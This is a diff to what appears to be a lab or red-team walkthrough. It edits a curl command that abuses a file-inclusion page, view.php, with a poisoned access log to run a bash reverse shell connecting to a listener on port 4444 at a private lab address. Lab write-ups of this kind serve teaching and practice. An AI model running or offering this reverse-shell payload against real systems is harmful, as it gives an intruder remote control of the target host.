@@ -115,7 +115,7 @@ On this single-host deployment, the listener address is the verified local
 address `10.0.2.15`:
 
 ```bash
-curl --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'" "http://10.0.2.15/view.php"
+curl -sS -o /dev/null --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'" "http://10.0.2.15/view.php" && echo 'Reverse-shell request completed'
 ```
 
 ![Reverse-shell request](screenshots/m1_red_09_reverse_shell.png)
